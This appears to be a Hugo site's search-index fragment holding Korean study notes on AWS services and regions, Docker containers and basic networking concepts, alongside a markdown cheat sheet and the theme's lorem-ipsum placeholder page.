형식이 필요한 사용 사레에 사용할 수 있는 관리형 데이터 솔루션   애플리케이션관 관리 AWS 계정 서비스와 운영 리소스 모니터링, 감사, 구성   보안과 자격 증명 인증 및 권한 부여, 데이터 및 연결 암호화, 타사 인증 관리 시스템과 통합 등을 관리하는 서비스   애플리케이션 통합 결합 해제, API를 사용한 애플리케이션 개발 프로세스를 설계하기 위한 도구        AWS 핵심 서비스      범주 서비스 기능     Computing EC2 AWS 상의 가상화된 인스턴스     Lambda 서버리스 애플리케이션     Auto Scaling 자동으로 인스턴스를 확장, 축소시키는 서비스     Elastic Load Balancing 네트워크의 트래픽을 분산시켜주는 라우팅 서비스     Elastic Beanstalk 컴퓨팅과 네트워킹 인프라를 프로비저닝하는 작업을 추상화한 관리형 서비스           Networking VPC 사용자 개인의 프라이빗 네트워크를 생성하는 서비스     Direct Connect AWS 서비스의 전용선을 통해 직접 연결하는 서비스     Router 53 AWS의 DNS서비스로 도메인 등록, 레코드 관리, 라우팅 프로토콜, 상태검사 등의 서비스를 제공     CloudFront AWS에서 제공하는 분산 글로벌 콘텐츠 전송 네트워크 ( CDN )           Storage S3 저렴하고 안정적인 다목적 객체 스토리지 서비스     Glacier 저렴하고 장기 저장할 수 있는 대형 데이터 아카이브를 제공하는 서비스     EBS EC2와 OS의 작업 데이터를 호스팅하는 가상의 데이터 드라이브 서비스     Storage Gateway AWS 클라우드 스토리지를 로컬 온프레미스 어플라이언스처럼 사용하는 하이브리드 스토리지 시스템           Database RDS 관리형 데이터베이스 인스턴스로 Mysql, Oracle, Aurora 등의 다양한 엔진을 제공     DynamoDB 빠르고 유연하며, 확장성이 뛰어난 관리현 서비스로 비관계형 (NoSQL) 데이터 베이스 워크로드에 적합           Application management CloudWatch 이벤트를 통해 프로세스 성능 및 활용률을 모니터링 하는 서비스     CloudFormation 탬플릿을 사용하여 AWS 리소스에 대한 사용을 스크립트화 시켜 사용하는 서비스     CloudTrail 계정내 모든 API 이벤트 기록을 수집하는 서비스     Config AWS 계정에서 변경 관리와 규정 준수를 지원하도록 설계된 서비스           Security, identification IAM AWS 계정의 사용자를 역할을 통해 관리하는 서비스     KMS AWS 리소스의 데이터를 보호하는 암호화 키를 생성하고 키사용을 관리하는 관리형 서비스     Directory Service AWS에서 자격 증면이나 관계를 정리할 때, Cognito, Microsoft AD도메인과 같은 자격 증명 공급자와 통합시키는 역할을 수행           Application Intergrated SNS 자동으로 주제에 관한 알림을 다른 서비스로 보내는 알림 서비스     SWF 수행해야하는 일련의작업을 조정하는 서비스로, 윤활유나 접착제의 역할을 수행     SQS 분산 시스템 내에서 이벤트 중심 메시징으로 결합을 해제해서 대형 프로세스의 개별 단계를 조정하는 서비스     APT Gateway Application 구현에 필요한 API를 생성 및 관리하는 서비스       AWS 플랫폼 아키텍처   AWS는 짧은 지연 시간 엑세스를 보장하는 것이 매우 중요하기 때문에, 이와 관련해서 CloudFront, Route53, Firewall Manager 등의 여러 서비스가 사용된다. AWS 계정 내의물리적 AWS 데이터 센터는 AZ ( Available Zone ), 가용영역이라 하며 아래와 같이 Region code로 표시된다. 같은 Region 내의 가용 영역은 6개까지가능하며, 리전 내에는 일종의 네트워크 주소 공간인 VPC가 있는 데, 리소스는 이 VPC에 배포된다. VPC 내에 서브넷을 만들 어 특정 가용 영역과 연결시켜, 리소스를 효과적으로 격리하고 내구성을 높이기 위한 복제를 수행할 수 있다. AWS 리전의 종류      Region name Region code Endpoint     미국 동부(오하이오) us-east-2 us-east-2.amazonaws.com   미국 동부(버지니아 북부) us-east-1 us-east-1.amazonaws.com   미국 서부(캘리포니아 북부) us-west-1 us-west-1.amazonaws.com   미국 서부(오레곤) us-west-2 us-west-2.amazonaws.com   아프리카(케이프타운) af-south-1 af-south-1.amazonaws.com   아시아 태평양(홍콩) ap-east-1 ap-east-1.amazonaws.com   아시아 태평양(뭄바이) ap-south-1 ap-south-1.amazonaws.com   아시아 태평양(오사카-로컬) ap-northeast-3 ap-northeast-3.amazonaws.com   아시아 태평양(서울) ap-northeast-2 ap-northeast-2.amazonaws.com   아시아 태평양(싱가포르) ap-southeast-1 ap-southeast-1.amazonaws.com   아시아 태평양(시드니) ap-southeast-2 ap-southeast-2.amazonaws.com   아시아 태평양(도쿄) ap-northeast-1 ap-northeast-1.amazonaws.com   캐나다(중부) ca-central-1 ca-central-1 .amazonaws.com   중국(베이징) cn-north-1 cn-north-1.amazonaws.com   중국(닝샤) cn-northwest-1 cn-northwest-1.amazonaws.com   유럽(프랑크푸르트) eu-central-1 eu-central-1.amazonaws.com   유럽(아일랜드) eu-west-1 eu-west-1.amazonaws.com   유럽(런던) eu-west-2 eu-west-2.amazonaws.com   유럽(밀라노) eu-south-1 eu-south-1.amazonaws.com   유럽(파리) eu-west-3 eu-west-3.amazonaws.com   유럽(스톡홀름) eu-north-1 eu-north-1.amazonaws.com   중동(바레인) me-south-1 me-south-1.amazonaws.com   남아메리카(상파울루) sa-east-1 sa-east-1.amazonaws.com       AWS 안정성과 규정   AWS의 대부분의 서비스는 기본 규정, 법률, 보안의 대한 기초 사항이 존재한다. AWS 보안과 안정성을 위해 수 많은 노력과 시도들을 해왔으며, 이에 관련된 내용은 AWS 규정를 참조하길바란다.     AWS의 공동 책임 모델   AWS의 서비스는 기본적으로 보안에 대학 책임은 AWS와 사용자가 책임을 분담하는 구조를 이루고 있다. 클라우드 상의 인프라를 안정적으로 관리하는 일은 AWS의 책임이지만, AWS의 리소스를 사용하는 것은 사용자의 일이며, 그에 따른 책임도 사용자에게 있다.     AWS 책임의 따른 분류  사용자의 책임  클라우드 내부  사용자의 데이터 사용자 애플리케이션, 엑세스 관리 운영 체제, 네트워크, 엑세스 구성 데이터 암호화   \r\rAWS의 책임  클라우드 자체  하드웨어와 네트워크 유지보수 AWS 글로벌 인프라 관리형 서비스   \r\r\r   AWS 작업   AWS 서비스를 실행하려면 해당 서비스를 관리할 도구가 있어야 한다. AWS 서비스는 기본적으로 GUI 환경을 제공하지만, 보다 복잡한 환경을 구현할 경우에는 전문적인 관리 도구를 사용해야 할 수도 있다.    AWS CLI  AWS CLI를 사용하면 컴퓨터 명령줄에서 복잡한 AWS 작업을 실행할 수 있다. 작동방식에 익숙해지면 GUI에 비해 간단하고 효율적인 작업이 가능해진다.      AWS SDK  AWS 리소스에 엑세스하는 작업을 애플리케이션 코드에 통합하려면 쓰고 있는 언어에 맞는 SDk를 사용해야 한다.      기술지원 및 온라인 리소스  AWS에는 다양한 유형의 지원이 있으며, 지원마다 어떤 내용이 있는 지 이해할 필요가 있다.      지원플랜   기본 플랜은 모든 계정에 무료로 제공되며, 문서, 백서, 지원 포럼 등의 고객 서비스에 요구할 수 있고, 청구 및 계정 지원 문제가 포함된다.\n  개발자 플랜은 $29부터 시작하며, 계정 소유자 한 명만 일반적 지침과, 시스템 손상에 관해 문의할 수 있으며, 클라우드 지원 담당자가 응답한다.\n  비즈니스 플랜은 $100 이상이며 문의할 수 있는 사용자 수에 제한이 없고, 신속한 응답을 보장한다. 시스템 손상, 개별적 지침, 문제 해결, 지원 API 등의 서비스를 제공한다.\n  엔터프라이즈 지원 플랜은 다른 지원 모든 지원 플랜을 포함하며, 운영과 설계 검토를 위한 AWS 솔루션스 아키텍트 지원, 전담 기술 지원, 관리자 지원, 컨시어지 지원이 추가된다.\n  엔터프라이즈 지원은 복잡한 미션 크리티컬 배포에 큰 도움이 될 수 있지만, 매월 최소 $15.000을 지급해야 한다.\n  지원플랜 참고 사이트\n      기타 지원 리소스  AWS 커뮤니티 포럼 AWS 설명서 AWS Well-Architected       1장 요약    클라우드 컴퓨팅은 물리적 리소스를 작고 유연한 가상 단위로 나누는 기술에 기반을 둔다.\n  AWS는 거대한 물리적 리소스를 가상 단위로 나누어, 가장의 리소스를 종량제로 임대하여 저렴하게 제공해주는 서비스이다.\n  AWS 장점은 탄력성과 확장성으로, 이는 자원의 소모를 자동적으로 유동적으로 비용을 최소화시킬 수 있다.\n  많은 AWS의 서비스들이 있으며, 이를 통해 거의 모든 디지털 요구사항을 처리할 수 있다. 또한 이러한 서비스들은 지금도 확장되어가고 있다.\n  AWS 리소스는 Management Console과 AWS CLI로 관리할 수 있으며, AWS SDK로 생성한 코드로도 관리할 수 있다.\n  기술 및 계정 지원에는 지원 플랜, 설명서, 포럼, 백서 등이 있다.\n    "});index.add({'id':19,'href':'/docs/cloudcomputing/awssaa/saa-4/','title':"4장 VPC",'content':"4장 Amazon Virtual Private Cloud  ****       ~\n    "});index.add({'id':20,'href':'/docs/cloudcomputing/awstraining/start/','title':"AWS 시작하기",'content':"AWS 시작히기    AWS 계정 생성    AWS 서비스를 이용하기 위한 계정을 생성하고, MFA를 사용하여 보안을 강화하는 방법에 대해 알아보도록 하겠습니다.     -먼저 AWS을 통해 AWS에 접속합니다.\n    AWS 계정 새로 만들기를 선택합니다.      다음 항목들을 기입 후, 계정 만들기를 선택합니다.      프로페셔널과 개인 중 맞는 항목을 선택 후, 아래 항목들을 기입합니다. 영어 주소를 모를시 Link를 참조하세요.   프로페셔널 : 조직, 기업의 사용\n개인 : 개인적으로 사용\n     사용가능한 카드에 대한 정보를 입력합니다. 여기서 amazon에서 $1를 뺏어감니다\u0026hellip;. 후 실습예제 중에서는, 최대한 프리 티어를 기준으로 사용하지만, 특정 서비스 사용시 과금이 발생할 수 있습니다.      각 항목에 알맞은 정보를 기입 후, 인증을 진행합니다.      인증 진행 후, 기본 플랜을 선택합니다.      가입이 완료되면 다시 초기화면으로 돌아와 이메일 주소와 암호를 입력 후 진행합니다.      다음으로는 서비스를 다루기 앞서, 보안을 위해 MFA를 등록하겠습니다. 메인 창에서 IAM을 입력 후, IAM에 진입합니다.      IAM 진입이 완료되면, 중앙에 메인페이지에 보이는 루트 계정에서 MFA 활성화를 선택 후, MFA 관리를 클릭합니다.      멀티 팩터 인증 ( MFA )를 클릭 후, MFA 활성화를 클릭합니다. 혹시 다른 인증방법이 궁금하신 분들은 Link를 참조하세요.      가상 MFA 디바이스를 클릭 후, Authenticator를 구글 스토어 혹은 앱 스토어에서 다운로드 받습니다.      앱을 실행 시킨 후, QR 코드를 입력 후, MFA 코드를 2차례 입력합니다.      등록이 완료되면 다음과 같이 일련번호를 확인 할 수 있습니다.      계정을 로그아웃 후, 다시 로그인하면 다음과 같이 MFA코드를 입력창이 나옵니다. 설치한 Authenticator을 실행 후, MFA 값을 입력하면 성공적으로 로그인이 가능합니다.    다음으로는 IAM을 통한 사용자 계정생성에 대해 알아보도록 하겠습니다.  "});index.add({'id':21,'href':'/docs/cloudcomputing/','title':"CloudComputing",'content':"Amazon Web Service AWS와 CloudComputing  Amazon Web Services ( AWS )  AWS Cloud Computing 와 AWS   Cloud Computing의 종류  IaaS PaaS SaaS   On Premise 서버와 Cloud 서버의 차이  소유자 ( Owner ) 용량 ( Capacity )   렌탈 서버 ( 공유 서버 )와 Public의 차이  렌탈 서버 전용 서버와 가상 전용 서버 렌탈 서버와 AWS ( Public )의 차이   Private Cloud와 Public Cloud  AWS에서의 Private Cloud의 정의 AWS 서비스의 구성    AWS Computing  EC2  EC2 상태의 종류 EC2 구매옵션   Lightsail  Lightsail의 유료 Plan Lightsail\u0026amp; EC2   ECS  Linux Container Kernel Docker   Lambda  Lambda EC2 vs Lambda   Batch  amazonwebservice Batch의 구성요소 Batch Group   Elastic Beanstalk  Elastic Beanstalk의 장점     AWS Database  Amazon RDS ( Relational Database Service )  DB Instance DB Instance Storage Multi-AZ Read Replica Automated Backup Enhanced Monitoring RDS vs DB in EC2   Amazon DynamoDB  DynamoDB의 특징   Amazon ElastiCache  Cache In Memory Cache ( In Memory DataBase ) Memcache ElastiCache   Amazon Redshift  Redshift Redshift의 구성 Data Warehouse(DW) ETL(Extract, Tranform, Load) BI(Business Intelligence) Redshift vs RDS   Amazon Aurora   AWS Storage         AWS Network AWS Migrate AWS Developer AWS Management AWS Security AWS Analysis "});index.add({'id':22,'href':'/docs/','title':"Doc",'content':"Introduction Ferre hinnitibus erat accipitrem dixi Troiae tollens Lorem markdownum, a quoque nutu est quodcumque mandasset veluti. Passim inportuna totidemque nympha fert; repetens pendent, poenarum guttura sed vacet non, mortali undas. Omnis pharetramque gramen portentificisque membris servatum novabis fallit de nubibus atque silvas mihi. Dixit repetitaque Quid; verrit longa; sententia mandat quascumque nescio solebat litore; noctes. Hostem haerentem circuit plenaque tamen.\n Pedum ne indigenae finire invergens carpebat Velit posses summoque De fumos illa foret  Est simul fameque tauri qua ad Locum nullus nisi vomentes. Ab Persea sermone vela, miratur aratro; eandem Argolicas gener.\nMe sol Nec dis certa fuit socer, Nonacria dies manet tacitaque sibi? Sucis est iactata Castrumque iudex, et iactato quoque terraeque es tandem et maternos vittis. Lumina litus bene poenamque animos callem ne tuas in leones illam dea cadunt genus, et pleno nunc in quod. Anumque crescentesque sanguinis progenies nuribus rustica tinguet. Pater omnes liquido creditis noctem.\nif (mirrored(icmp_dvd_pim, 3, smbMirroredHard) != lion(clickImportQueue,\rviralItunesBalancing, bankruptcy_file_pptp)) {\rfile += ip_cybercrime_suffix;\r}\rif (runtimeSmartRom == netMarketingWord) {\rvirusBalancingWin *= scriptPromptBespoke + raster(post_drive,\rwindowsSli);\rcd = address_hertz_trojan;\rsoap_ccd.pcbServerGigahertz(asp_hardware_isa, offlinePeopleware, nui);\r} else {\rmegabyte.api = modem_flowchart - web + syntaxHalftoneAddress;\r}\rif (3 \u0026lt; mebibyteNetworkAnimated) {\rpharming_regular_error *= jsp_ribbon + algorithm * recycleMediaKindle(\rdvrSyntax, cdma);\radf_sla *= hoverCropDrive;\rtemplateNtfs = -1 - vertical;\r} else {\rexpressionCompressionVariable.bootMulti = white_eup_javascript(\rtable_suffix);\rguidPpiPram.tracerouteLinux += rtfTerabyteQuicktime(1,\rmanagementRosetta(webcamActivex), 740874);\r}\rvar virusTweetSsl = nullGigo;\r Trepident sitimque Sentiet et ferali errorem fessam, coercet superbus, Ascaniumque in pennis mediis; dolor? Vidit imi Aeacon perfida propositos adde, tua Somni Fluctibus errante lustrat non.\nTamen inde, vos videt e flammis Scythica parantem rupisque pectora umbras. Haec ficta canistris repercusso simul ego aris Dixit! Esse Fama trepidare hunc crescendo vigor ululasse vertice exspatiantur celer tepidique petita aversata oculis iussa est me ferro.\n"});index.add({'id':23,'href':'/docs/cloudcomputing/docker/docker-1/','title':"Docker란?",'content':"Docker란?    Docker      도커란 컨테이너 기반의 오픈소스 가상화 플랫폼으로 컨테이너형 가상화 기술을 구현하기 위해 상주 어플리케이션과 이 어플리케이션을 조작하기 위한 명령행 도구로 구성되는 프로덕트입니다.\n  컨테이너라 하면 배에 실는 네모난 화물 수송용 박스를 생각할 수 있는데 각각의 컨테이너 안에는 다양한 화물을 넣을 수 있고 규격화되어 컨테이너선이나 트레일러등 다양한 운송수단으로 쉽게 옮길 수 있습니다.\n  서버에서 이야기하는 컨테이너도 이와 비슷한데 다양한 프로그램, 실행환경을 컨테이너로 추상화하고 동일한 인터페이스를 제공하여 프로그램의 배포 및 관리를 단순하게 해줍니다. 백엔드 프로그램, 데이터베이스 서버, 메시지 큐등 어떤 프로그램도 컨테이너로 추상화할 수 있고 조립PC, AWS, Azure, Google cloud등 어디에서든 실행할 수 있습니다.\n     Docker Container     컨테이너는 격리된 공간에서 프로세스가 동작하는 기술로, 가상화 기술의 하나지만 기존 방식과는 차이가 있습니다.\n  우리에게 익숙한 VMware나 VirtualBox 같은 가상머신은 호스트 OS위에 게스트 OS전체를 가상화하여 사용하는 방식입니다. 이와 같은 방식은 여러 OS를 가상화할 수 있고 비교적 사용법이 간단하지만 무겁고 느려서 운영환경에서는 사용하기 힘들었습니다..\n  이와 같은 상황을 개선하기 위해 CPU의 가상화 기술인 ( HVM )을 이용한 KVM ( Kernel-basesd Virtual Machine )과 반가상화 ( Paravirtualiztion ) 방식의 Xen이 등장하였고, 이러한 방식은 게스트 OS가 필요하긴 하지만 전체 OS를 가상화 하는 방식이 아니였기 때문에 호스트형 가상화 방식에 비해 성능을 향상 시킬 수 있었습니다. 현재는 이 기술이 OpenStack, AWS, Rackspace와 같은 클라우드 서비스에서도 가상 컴퓨팅 기술의 기반이 되었습니다.\n  하지만 전가상화, 반가상화는 모두 추가적인 OS를 설치하여 가상화하는 방법으로 성능문제를 야기시킬 수 있었습니다.\n  그리고 이를 개선하기 위해 프로세스를 격히하는 방식이 등장하였고, 이를 컨네이너라고 합니다.\n     상단의 그림처럼 OS를 사용할 경우 overhead의 가능성이 높아집니다.\n  하지만 컨테이너 방식은 단순히 프로세스를 격리시키기 때문에 가볍고 빠르게 동작하며, CPU나 메모리는 프로세스가 필요한 만큼만 추가로 사용하고 성능적으로도 거의 손실이 없습니다.\n  아래는 도커의 컨테이너형 가상화 기술의 대한 간략적인 설명입니다.\n 도커는 컨테이너형 가상화 기술을 사용합니다.. 도커가 등장하기 전에는 LXC가 유명했는 데, 도커도 초기에는 컨테이너형 가상화를 구현하는데 LXC를 런타임으로 사용했습니다. ( 현재는 runC ) 컨테이너형 가상화를 사용하면 가상화 소프트웨어 없이도 운영 체제의 리소스를 격리해 가상 운영체제로 만들 수 있습니다. 컨테이너를 만들면서 발생하는 오버헤드는 다른 가상화 소프트웨어보다 더 적습니다. LXC는 호스트 운영체제 가상화보다 성능면에서는 유리하다는 장점이 있지만 아직까지 이식성은 낮습니다.    LXC와 Docker의 차이점\n 호스트 운영체제의 영향을 받지 않는 실행 환경 DSL ( Dockerfile )을 이용한 컨테니어 구성 및 어플리케이션 배포 정의 이미지 버전 관리 레이어 구조를 갖는 이미지 포맷 프로그램 가능한 다양항 기능의 API       Docker Image     도커에서 가장 중요한 개념은 컨테이너와 함께 이미지라는 개념입니다.\n  이미지란 컨테이너 실행에 필요한 파일과 설정 값 등을 포함하고 있는 것으로, 상태 값을 가지지 않고 변하지 않습니다.\n  컨테이너 이미지를 실행한 상태라고 볼 수 있고 추가되거나 변하는 값들은 모두 컨테이너에 저장됩니다.\n  이미지는 말 그대로 컨테이너를 실행하기 위한 모든 정보를 가지고 있기 때문에, 더 이상 의존성 파일을 컴파일하고 추가적으로 설치할 필요가 적습니다.\n  도커의 이미지는 Docker hub에 등록하거나, Docker Registry 저장소를 직접 만들어 관리할 수 있으며, 누구나 쉽게 이미지를 만들고 배포할 수 있습니다.\n     레이어 저장방식   도커 이미지는 컨테이너를 실행하기 위한 모든 정보를 가지고 있기 때문에 보툥 수백메가에 용량을 가지고 있습니다. 처음 이미지를 다운 받을 때는 크게 부담이 되지 않지만, 기존 이미지에 파일 하나추가 되었을 때 다시 받아야 한다면 매우 비효율적일 수 밖에 없습니다.\n  도커는 이런 문제를 해결하기 위해 레이어 ( layer ) 라는 개념을 사용하고 유니온 파일 시스템을 이용하여 여러개의 레어를 하나의 파일시스템으로 사용할 수 있게 해줍니다.\n  여러개의 layer로 구성되고 파일이 추가되거나 수정되면 새로운 레이어가 추가되는 방식으로 레이어 저장방식을 통하면, 단순하지만 효율적인 설계가 가능해집니다.\n     Docker Architecture     Docker 사용에 의의   코드로 관리하는 인프라 ( Infrastructure as Code )와 불변 인프라 ( Immutable Infrastructure )   코드 기반으로 인프라를 정의한다는 개념입니다. 코드 기반으로 인프라를 구축하고 관리한다 하여도 항구적인 코드를 계속 작성하는 것은 운영 업무에 부담을 주기 쉽습니다.. 서버의 대수가 늘어날수록 모든 서버에 구성을 적용하는 시간도 늘어납니다. 어떤 시점의 서버 상태를 저장해 복제할 수 있게 하는 개념입니다. 도커는 인프라 실행에 걸리는 시간이 적은 만큼 구성을 수정하지 않고 인프라를 완전히 새로 만드는 불변 인프라와 궁합이 잘 맞는 장점을 가지고 있습니다.     어플리케이션과 인프라 묶어 구축하기  운영체자와 어플리케이션을 함께 담는 상자의 개념의 컨테이너를 사용합니다. 어플리케이션과 인프라를 함께 관리한 결과로 얻는 높은 이식성을 가지고 있습니다.     어플리케이션 구성 관리의 용이   일정 규모를 넘는 시스템은 주로 여러 개의 어플리케이션과 미들웨어를 조합하는 형태로 구성되어집니다. 즉, 여러 어플리케이션과 미들웨어를 조합하지 않으면 시스템을 구성할 수 없습니다. 결과적으로 시스템 전체에 대한 적절한 구성관리가 필요해졌는 데, 이에 대한 적합한 솔루션이 도커입니다.     Docker 오케스트레이션   여러 서버에 걸쳐 있는 여러 컨테이너를 관리하는 Docker 오케스트레이션 기능을 사용합니다. 여러 컨테이너를 사용하는 어플리케이션을 쉽게 관리할 수 있도록 도커 컴포즈 ( Dockercompose )라는 도구를 제공합니다.  Docker Compose : 여러 컨테이너를 관리하는 도구 Docker Swarm : 컨테이너 증가 혹은 감소, 노드의 리소스를 효율적으로 활용하기 위한 컨테이너 배치 및 로드 밸런싱 기능 등 실용적인 기능을 갖추고 있음 Kubernetes : 컨테이너 오케스트레이션 분야에서의 표준       새로운 개발 스타일   전보다는 어플리케이션 개발에 집중할 있는 분위기를 구현이 가능합니다. 인프라와 어플리케이션의 설정을 모두 코드 수준에서 쉽게 수정할 수 있게 할 수 있습니다. 기존에는 명확했던 인프라 엔지니어와 서버 사이드 엔지니어의 영역을 보다 쉽게 접근 및 관리가 가능해집니다. 프론트엔드 엔지니어와 모바일 어플리케이션 엔지니어에게도 기초 기술로 자리 잡을 수 있습니다.  "});index.add({'id':24,'href':'/docs/network/%EC%A0%95%EB%A6%AC%EC%A0%84/%EC%A0%95%EB%A6%AC/','title':"Home",'content':" 인\n 용\n 구\n      1 2 3     표 쓸때는 중간 두번째줄에 --- 이거 필요합니다.          이탤릭 , 이탤릭\n볼드 볼드\n이탤릭볼드\n이탤릭볼드\n이렇게 할수도\n취소선\n이건데 .. *이렇게*\n😍\nhttps://steemit.com/steemkr-guide/@snow-airline/steemkr-quick-start-guide\n@Link, #Link?\n#이미지 넣기 ? + 컨트롤 z = 자동 주석처리\n# = 강조 ## 두개 = 목차 달기 별 두개 = 강조\n별 새게 = 기울이기 mandat\n 순서 달기 술서 달기 2   번호 달기 번호 달기2  박스 박스박스 ( 들여쓰기 )\n들여쓰기  버튼 양식 {{\u0026lt; button relref=\u0026#34;/\u0026#34; [class=\u0026#34;...\u0026#34;] \u0026gt;}}Get Home{{\u0026lt; /button \u0026gt;}} {{\u0026lt; button href=\u0026#34;https://github.com/alex-shpak/hugo-book\u0026#34; \u0026gt;}}Contribute{{\u0026lt; /button \u0026gt;}} \rGet Home\r\rContribute\r\rColumns 양식 {{\u0026lt; columns \u0026gt;}} \u0026lt;!-- begin columns block --\u0026gt; # Left Content Lorem markdownum insigne... \u0026lt;---\u0026gt; \u0026lt;!-- magic sparator, between columns --\u0026gt; # Mid Content Lorem markdownum insigne... \u0026lt;---\u0026gt; \u0026lt;!-- magic sparator, between columns --\u0026gt; # Right Content Lorem markdownum insigne... {{\u0026lt; /columns \u0026gt;}} 왼쪽 컬럼 인쪽 내용\r\rMid Content 이러쿵 저러쿵\r\rRight Content 이하 동일\r\r\rExpend {{\u0026lt; expand \u0026gt;}} ## Markdown content Lorem markdownum insigne... {{\u0026lt; /expand \u0026gt;}} \rExpand\r↕\r\rMarkdown content 폼 안의 폼?\r\r\r\r또 다른 폼 {{\u0026lt; expand \u0026#34;Custom Label\u0026#34; \u0026#34;...\u0026#34; \u0026gt;}} ## Markdown content Lorem markdownum insigne... {{\u0026lt; /expand \u0026gt;}} \rCustom Label\r...\r\rMarkdown content 커스텀 폼폼\r\r\r\rHint {{\u0026lt; hint [info|warning|danger] \u0026gt;}} {{\u0026lt;hint n\u0026gt;}} 내용 {{\u0026lt; /hint \u0026gt;}} {{\u0026lt; /hint \u0026gt;}}  칸 정 리 하 기\n n = info\n내용\r\rn = warining\n내용\r\rn =danger\n내용\r\rkatex 이거보샘\nmermaid 이거보샘\ntabs {{\u0026lt; tabs \u0026#34;uniqueid\u0026#34; \u0026gt;}} {{\u0026lt; tab \u0026#34;MacOS\u0026#34; \u0026gt;}} # MacOS Content {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; tab \u0026#34;Linux\u0026#34; \u0026gt;}} # Linux Content {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; tab \u0026#34;Windows\u0026#34; \u0026gt;}} # Windows Content {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; /tabs \u0026gt;}} \rMacOS\rMacOS 설명Linux\rLinux 설명Windows\rWindows 설명\r"});index.add({'id':25,'href':'/docs/system/linux/','title':"Linux",'content':"a\n"});index.add({'id':26,'href':'/docs/network/network/natwork-1/','title':"Network",'content':"Network    Network란 무엇인가?       네트워크란 물리적으로 떨어져 있는 여러 시스템을 연결하여 데이터를 주고 받을 수 있게 연결되어 있는 시스템\n  노드들이 데이터를 공휴할 수 있게 하는 디지털 전기 통신망의 한 종류로, 분산되어 있는 컴퓨터를 통신망을 통해 연결한 것을 말한다.\n  흔히 사람들은 네트워크와 인터넷을 함께 혼용하지만 인터넷은 문서, 그림, 영상과 같은 여러가지 데이터를 공유하도록 구성된 거대한 네트워크를 의미로, 인터넷이 네트워크에 포함되어 있다고 할 수 있다.\n  또한 www를 인터넷으로 착각하는 경우가 있는 데, www는 인터넷을 통해 웹과 관련된 데이터를 공유하는 기술이다.\n     네트워크의 분류   크기의 따른 분류     분류 설명     LAN Local Area Network, 하나의 장비(스위치)에 연결되어 있는 여러 시스템이 속한 네트워크   WAN Wide Area Network, 하나 이상의 LAN으로 구성된 네트워크   PAN Personal Area Network, 개인이 사용하는 작은 단위의 네트워크   MAN Metropolice Area Network, 하나의 도시 단위의 네트워크        구성방법에 따른 분류      분류 설명     스타형 중앙에 있는 네트워크 장비를 통해 모두 연결된 형태, 중앙의 장비가 고장나면 모든 시스템들이 통신 불가 2계층, 스위치 장비를 통해 LAN 대역을 구성   망형 모든 시스템들이 각각 개별적으로 연결됨, 비용이 많이 든다. 3계층, 라우터 장비를 통해 WAN 대역을 구성   버스형 하나의 선을 통해 여러 시스템을 연결   트리형 시스템을 여러 계층으로 나눠서 연결   링형 인접 시스템을 1:1로 연결   혼합형 여러 형태를 조합하여 구성한 형태       네트워크의 통신방식    그림 옵션 설명      유니캐스트 1:1 통신을 할 때 사용하는 방식, 특정 대상과 통신을 할 때 사용하는 방식    멀티캐스트 1:n 특정 그룹과 통신하는 방식    브로드캐스트 1:n 네트워크 내의 모든 시스템과 통신하는 방식, 불특정 다수와 통신       네트워크 프로토콜  네트워크 내의 시스템 간의 통신을 위한 규칙, 약속 이는 택바와 유사하며, 특정 노드가 어느 노드에게 어떤 데이터를 어떻게 보내는 지를 작성하기 위한 양식    기본적으로 패킷이라 한다.     cmd에서 tracert 8.8.8.8 로 확인\n   네트워크 패킷 ( Network Packet )    패킷이란 데이터의 묶음 단위로 한번에 전송할 데이터의 크기\n  제 3계층 이상 ( Network 계층 ) 에서는 이 데이터의 묶음을 패킷이라고 부르며, 제 2계층에서는 프레임( Frame )\n  패킷의 크기는 네트워크의 종류에 따라 크기가 다름\n  패킷을 이렇게 나눠 보내는 이유는 컴퓨터는 동시다발적으로 데이터를 전송하는 데, 한 데이터에게만 데이터를 줄 경우, 한 컴퓨터와의 통신밖에 하지 못하기에, 데이터를 나눠 모두에게 통신할 수 있게 하며, 중간에 에러가 날 경우를 대비\n     패킷의 기본 구조      크게 패킷은 헤더 ( header ) 와 페이로드 ( Payload ) 두 부분으로 나누어 진다.\n Hader: 출발 주소, 도착 주소, 패킷 길이 등 ( 헤더에 종류에 따라 내용이 달라질 수 있음 ) Payload: 전송되는 실제 콘텐츠나 데이터 ( 이메일, 메시지, 인터넷 전화, 웹서핑 세션 등)    즉 위의 그림과 같이 데이터는 계층의 헤더 ( Hader ) + 페이로드 ( Payload )로 이루어져 있으며, 헤더가 붙은 계층에 따라 비트, 프레임, 패킷, 세그먼트, 데이터 라 한다.\n     각 네트워크 계층의 단위 \rNetwork Layer \r...\r\r\r\r\r  헤더는 우편 봉투에 적혀있는 주소와 유사한 열할을 하며, 페이로드는 편지봉투 안의 편지 내용을 뜻한다 할 수 있다\n  데이터는 데이터 상태로 상대방에게 바로 전달해주지 못한다. 그렇기에 상대방이 데이터를 볼 수 있게 송신과정을 거쳐야 하는 데 이를 인 캡슐레이션 이라 하며, 수신자는 반대로 수신과정을 거치는 데 이를 디 캡슐레이션 이라 한다.\n   네트워크 인 캡슐레이션 ( Network Encapsulation )  \rNetwork Encapsulation \r...\r\r   위에 언급한 듯이 송신자가 수신자에게 데이터를 볼 수 있도록 포장하는 것을 인캡슐레이션이라 하며 이는 OSI L7에서 L1 방향으로 진행 된다.\n  Payload를 4 계층 TCP 헤더로 캡슐화( 세그먼트 ) -\u0026gt; IPv4, TCP 헤더로 캡슐화 ( 패킷 ) -\u0026gt; IPv4, TCP, Ethernet( 프레임 )으로 캡슐화 하는 것을 인 캡슐레이션이라 한다.\n  \r\r\r 네트워크 디 캡슐레이션 ( Network Depsulation )  \rNetwork Decapsulation \r...\r\r  인캡슐레이션 되어진 ( 포장되어진 ) 페이로드를 읽기위해서 포장되어진 역 순서로 다시 헤더를 제거하는 것을 디 캡슐레이션이라 하며, OSI L1에서 L7 방향으로 진행 된다.\n  Payload를 IPv4, TCP, Ethernet ( 프레임 ) -\u0026gt; IPv4, TCP, ( 패킷 ) -\u0026gt; TCP ( 세그먼트 ) -\u0026gt; 데이터로 캡슐화를 해제하는 것을 디 캡슐레이션이라 한다.\n  \r\r\r     각 계층의 Protocol   각 프로토콜은 2진수 1개 = 1bit 2진수 8개 = 8bit 2진수 4개 = 16진수 1개 16진수 2개 = 2진수 8개 16진수 2개 8bit = 1byte를 뜻함   2계층 ( Data-Link )    2계층은 하나의 네트워크 대역 즉, 네트워크 상에 존재하는 여러 장비들 중에서 어떤 장비에게 보내는 데이터를 전달하는 역할 을 수행.\n  추가적으로 오류제어, 